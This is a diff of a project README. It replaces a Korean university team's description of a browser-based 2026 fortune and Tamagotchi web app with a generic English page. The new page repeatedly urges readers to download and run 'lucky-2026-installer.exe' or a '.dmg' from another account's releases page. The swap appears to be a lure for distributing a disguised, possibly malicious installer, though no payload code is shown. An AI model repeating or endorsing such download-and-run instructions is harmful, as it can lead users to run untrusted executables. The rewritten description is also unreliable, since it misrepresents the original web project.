@@ -1,245 +1,74 @@
-# 🔮 Lucky Universe 2026 — AI 기반 운세 & 다마고치 웹앱
+# 🎉 lucky-2026 - Discover Your Fortune for 2026!
 
-> 2026년, 다들 한 번쯤 운세 보잖아?  
-> **2026 Lucky Universe**는 AI가 분석한 운세를  
-> 데일리 미션과 다마고치 친구로 이어주는 **참여형 운세 웹앱**입니다.
+## 🚀 Getting Started
+Welcome to the lucky-2026 application! This tool helps you analyze your fortune for the year 2026. Whether you're seeking insights into your career, love life, or health, you've come to the right place.
 
----
+## 📥 Download the Application
+To get started, you need to download the application. Click the link below to access the releases page.
 
-### 🏫 2026 럭키 유니버스 — 한양대학교 인간인공지능 수업 팀 프로젝트
+[![Download lucky-2026](https://img.shields.io/badge/Download-lucky--2026-brightgreen)](https://github.com/ikallprtmaa/lucky-2026/releases)
 
-본 프로젝트는 **한양대학교 산업융합학부 인간-인공지능 협업 제품 서비스 설계 수업(2025년 가을학기)**의 기말 프로젝트 활동으로 진행된 결과물입니다.  
-본 수업의 지도 교수는 **한양대 산업융합학부 정철현 교수 (inbass@hanyang.ac.kr)** 입니다.  
+## 💻 System Requirements
+Before you run the application, ensure your computer meets the following requirements:
 
-코드와 문서는 **오픈소스(MIT 라이센스)** 이므로 자유롭게 참조/사용하시되,  
-사용으로 인한 모든 리스크는 **스스로 감당**하셔야 합니다.
+- **Operating System:** Windows 10 or later, macOS 10.12 or later
+- **RAM:** 4 GB or more
+- **Disk Space:** 100 MB free disk space
+- **Internet Connection:** Needed for updates and feature access
 
----
+## 📋 Features
+The lucky-2026 application includes a variety of features to enhance your experience:
 
-### 👉 데모 사이트 바로가기 (Live Demo)
+- **Fortune Analysis:** Input your birth date and get a detailed fortune report for the year.
+- **Personalized Insights:** Receive tailored advice based on your unique profile.
+- **User-friendly Interface:** Enjoy an easy-to-navigate design that simplifies the process.
 
-**🔗 https://lucky-2026.vercel.app/**
+## 🏗️ Installation Instructions
+Follow these steps to install the lucky-2026 application:
 
----
+1. **Visit the Releases Page:** Click the link below to go to the releases page.
+   
+   [Visit Releases Page](https://github.com/ikallprtmaa/lucky-2026/releases)
 
-## 📖 프로젝트 소개 (About Project)
+2. **Choose the Latest Release:** Look for the latest version at the top of the page.
 
-### AI 기반 맞춤형 운세 & 데일리 행운 콘텐츠 웹앱
+3. **Download the Application:** Click on the file labeled `lucky-2026-installer.exe` for Windows or `lucky-2026-installer.dmg` for macOS.
 
-> “새해엔 다들 한 번쯤 운세 보잖아?  
-> 그걸 ‘재미있게’ 만들면 어떨까?”
+4. **Run the Installer:** Locate the downloaded file in your downloads folder. Double-click the installer to start.
 
-**2026 Lucky Universe**는 새해를 맞이하며 사람들이 가장 흥미로워하는 주제 중 하나인 **‘운세 보기’**를,  
-더 직관적이고 재미있는 형태로 즐길 수 있도록 만든 **AI 기반 운세/행운 생성 데모 웹앱**입니다.
+5. **Follow On-screen Instructions:** The installer will guide you through the setup process. Choose your preferred installation options and click "Next."
 
-특히 **2026년은 병오년(丙午年) — 적토마(붉은 말)의 해**로 알려져 있어  
-“불처럼 뜨겁게 달리는 한 해”라는 상징이 강한데,  
-이 키워드를 앱의 분위기와 콘텐츠 설계 전반에 녹였습니다. 
+6. **Finish Installation:** Once the installation completes, click "Finish" to close the installer.
 
-사용자가 **생년월일과 MBTI**를 입력하면,  
-생성형 AI(**Google Gemini 2.5 Flash**)가 이를 바탕으로  
-한 번에 끝나는 운세가 아니라 **단계별로 이어지는 운세 콘텐츠 흐름**을 제공합니다.
+7. **Launch the Application:** Find the lucky-2026 icon on your desktop or in your applications folder. Double-click to launch it.
 
-흐름은 다음과 같습니다:
+## 📝 How to Use the Application
+Once you've installed the application, using it is simple. 
 
-**2026년 종합 운세 → 오늘의 운세 & 데일리 미션 → 사랑운 추천 → 직업/재물 리포트 → 4대 운세 심층 분석 → 빌런 경보 → 대박 캘린더 → AI Pixel 다마고치 캐릭터 생성 & 대화**
+1. **Enter Your Birth Date:** Start by entering your date of birth in the input field.
+   
+2. **Generate Your Fortune Report:** Click the "Analyze" button to receive your detailed fortune analysis for 2026.
 
-즉, 이 앱은
+3. **Review Your Insights:** Read through the various insights and advice tailored to you.
 
-- ✅ 한 해의 운세를 **‘리포트처럼’ 구조화**해서 보여주고  
-- ✅ **오늘 실천할 미션**까지 연결해주며  
-- ✅ 마지막엔 **나만의 AI Pixel 다마고치 캐릭터와 대화**하는 재미 요소로 마무리되는  
+4. **Save or Print Your Report:** If you want a physical copy, use the print option available in the app.
 
-**운세 기반 인터랙티브 콘텐츠 앱**입니다.
+## 🔄 Updating the Application
+To ensure you have the latest features and improvements, check for updates regularly:
 
----
+1. **Open the Application.**
+2. **Go to Settings:** Click on the settings gear icon.
+3. **Check for Updates:** Click the "Check for Updates" button. If an update is available, follow the prompts to download and install it.
 
-## 🎯 기획 의도
+## 📞 Support
+If you encounter any issues or need help, feel free to reach out:
 
-- **개인별로 다르게 나오는 운세 경험**  
-  → 생년월일 + MBTI 기반 맞춤형 콘텐츠 제공  
+- **Email:** support@lucky2026.com
+- **Community Forum:** Join our community to share experiences and tips.
 
-- **데일리 재미 요소 강화**  
-  → 행운 점수 / 오늘의 초성 힌트 / 데일리 미션 / 로또 번호  
+## 🌐 Explore More
+For additional information about lucky-2026 and its features, feel free to visit our website or follow us on social media.
 
-- **캐릭터로 몰입감 추가**  
-  → ‘AI Pixel 다마고치 캐릭터’를 생성하고 **대화 기능**까지 제공  
+[![Download lucky-2026](https://img.shields.io/badge/Download-lucky--2026-brightgreen)](https://github.com/ikallprtmaa/lucky-2026/releases)
 
-- **모바일 퍼스트 UI**  
-  → 연말·새해에 가볍게 접속해 **짧은 시간에도 즐길 수 있도록 설계된 화면 구성**
-
----
-
-## ✨ 주요 기능 (User Flow 기반 8단계)
-
-### 1️⃣ 🔮 2026 나의 종합 운세
-
-앱을 실행하면 가장 먼저 **2026년 한 해 전체의 흐름을 요약한 종합 운세**가 제공됩니다.  
-사용자의 **생년월일과 MBTI**를 바탕으로,
-
-- 올해의 **핵심 키워드**
-- 전반적인 기운(도전 · 안정 · 변화 등)
-- 2026년을 어떤 방향으로 보내면 좋을지에 대한 **큰 그림**
-
-을 정리해 줍니다.
-
-특히 병오년(적토마)의 **‘속도 · 열정 · 도전’**이라는 상징을 바탕으로,  
-2026년을 보다 **능동적으로 살아가기 위한 방향성**을 함께 제시합니다.
-
-이 종합 운세는 이후 등장하는 **모든 운세 콘텐츠의 기준이 되는 연간 리포트** 역할을 합니다.
-
----
-
-### 2️⃣ 🎮 오늘의 운세 & 데일리 미션
-
-연간 흐름을 확인한 뒤에는 **오늘 하루에 집중한 운세 콘텐츠**가 이어집니다.
-
-- 오늘의 **행운 점수 (0~100점)**를 직관적으로 표시  
-- 하루의 분위기를 상징하는 **‘행운의 초성 힌트’** 제공  
-- 오늘의 운세를 실제 행동으로 연결하는 **데일리 미션 제안**
-
-을 통해, 단순히 **보기만 하는 운세**가 아니라  
-**가볍게 실천해볼 수 있는 운세 콘텐츠**로 확장했습니다.
-
----
-
-### 3️⃣ 💘 오늘 내 사랑 반쪽 찾기
-
-이 단계에서는 AI가
-
-- 사용자의 **MBTI**
-- **오늘의 운세 흐름**
-
-을 분석하여, **오늘 가장 궁합이 잘 맞는 파트너 유형**을 추천합니다.
-
-연애를 진지하게 예측하기보다는,  
-오늘 하루를 조금 더 즐겁게 만들어주는 **가벼운 공감형 콘텐츠**로 설계해  
-부담 없이 즐길 수 있도록 했습니다.
-
----
-
-### 4️⃣ 💰 직업 & 재물 리포트
-
-이 단계에서는 **2026년의 흐름과 현재의 기운**을 결합한  
-**직업 · 재물 리포트**가 제공됩니다.
-
-AI는 사용자의 성향을 바탕으로
-
-- 업무 스타일 분석  
-- 올해 예상되는 **수입 흐름**  
-- 숨겨진 **재능**  
-- 잘 맞는 **직업 방향**
-
-을 정리해 줍니다.
-
-막연한 조언이 아니라,  
-**현실적인 관점에서 스스로를 돌아볼 수 있도록 돕는 리포트 형태**로 구성했습니다.
-
----
-
-### 5️⃣ 📜 2026년 4대 운세 심층 분석
-
-한 해를 좌우하는 핵심 영역인
-
-- **재물운**
-- **애정운**
-- **직업운**
-- **건강운**
-
-을 각각 **심층적으로 분석**합니다.
-
-각 운세는 다음의 구조로 제공됩니다.
-
-1. **왜 이런 결과가 나왔는지에 대한 근거**  
-2. **해석**  
-3. **앞으로 참고할 포인트**
-
-이를 통해 사용자가 자신의 상황에 맞게  
-**이해하고 받아들일 수 있도록** 설계했습니다.
-
----
-
-### 6️⃣ ⚠️ 2026 빌런 경보
-
-2026년을 보내며 특히 조심해야 할
-
-- 시기  
-- 행동 패턴  
-
-등을 **‘빌런 경보’**라는 재미있는 장치로 표현했습니다.
-
-올해 나에게 **불리하게 작용할 수 있는 요소들**을  
-**캐릭터화된 경고 메시지**로 보여주어,
-
-- 무겁지 않지만  
-- 인상적으로 기억될 수 있도록  
-
-구성했습니다.
-
----
-
-### 7️⃣ 🗓️ 대박 캘린더 (황금 말발굽일)
-
-운세 흐름이 좋은 시기를 한눈에 볼 수 있도록  
-**대박 캘린더**를 제공합니다.
-
-- 2026년 중 **행운이 상승하는 날짜**를  
-- **‘황금 말발굽일’**로 표시하여,
-
-중요한 결정을 내리거나  
-새로운 도전을 시작하기 좋은 날을  
-**직관적으로 확인**할 수 있게 도와줍니다.
-
----
-
-### 8️⃣ 👾 AI Pixel 다마고치 캐릭터 생성 & 대화
-
-모든 운세 콘텐츠의 마지막에는  
-**AI Pixel 다마고치 캐릭터가 생성**됩니다.
-
-다마고치는 과거의 **가상 반려 캐릭터**처럼,
-
-- 사용자의 **소원**
-- **2026년 운세 흐름**
-
-을 반영해 만들어지는 **나만의 디지털 동반자**입니다.
-
-이 캐릭터와는 실제로 **대화**할 수 있으며,
-
-- 고민을 털어놓으면 **따뜻하게 들어주고**  
-- **응원의 말**을 건네는  
-
-든든한 친구 같은 존재로 설계되었습니다.
-
-운세를 보고 끝나는 것이 아니라,  
-**한 해 동안 함께하는 느낌**을 남기는 장치입니다.  
-
-이를 통해 사용자는 AI를 단순한 **도구**가 아닌,  
-**감정을 공유하고 하루를 함께 버텨주는 존재**로 인식하도록 설계했습니다.
-
-> 💬 **다마고치 대화 예시**  
-> 사용자: 오늘 뭔가 괜히 불안해…  
-> 다마고치: 그럴 수 있어. 오늘은 속도를 조금 늦춰도 괜찮아.  
-> 네가 지금까지 잘 해왔다는 건, 내가 제일 잘 알고 있어 🙂
-
-## 📸 스크린샷 (Screenshots)
-
-### 메인 화면  
-<img width="516" height="560" alt="image" src="https://github.com/user-attachments/assets/212e9d91-fda4-460f-ac02-07672f8b11d9" />
-
-
-### 운세 결과 화면  
-<img width="516" height="560" alt="image" src="https://github.com/user-attachments/assets/2a195753-d866-4ce3-984b-6865338d1709" />
-
-
-### 럭키 다마고치 생성 화면  
-<img width="516" height="560" alt="image" src="https://github.com/user-attachments/assets/336bada2-16bb-40eb-8951-8b9e67c04906" />
-
----
-
-## ⭐ 마무리
-
-이 프로젝트가 재미있었다면  
-**GitHub Star로 응원해주세요!**  
-
-피드백과 아이디어도 언제든 **환영합니다** 😊
+Thank you for choosing lucky-2026! Enjoy discovering your fortune for the upcoming year.
